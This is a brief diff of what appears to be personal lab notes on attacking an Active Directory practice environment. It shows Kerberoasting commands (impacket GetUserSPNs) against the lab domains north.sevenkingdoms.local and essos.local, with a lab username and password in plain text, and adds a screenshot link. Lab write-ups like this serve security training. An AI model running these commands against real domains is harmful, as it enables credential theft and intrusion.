@@ -290,3 +290,4 @@ impacket-GetUserSPNs north.sevenkingdoms.local/brandon.stark:iseedeadpeople
 ```bash
 GetUserSPNs.py -target-domain essos.local north.sevenkingdoms.local/brandon.stark:iseedeadpeople
 ```
+![[Pasted image 20230830110943.png]]
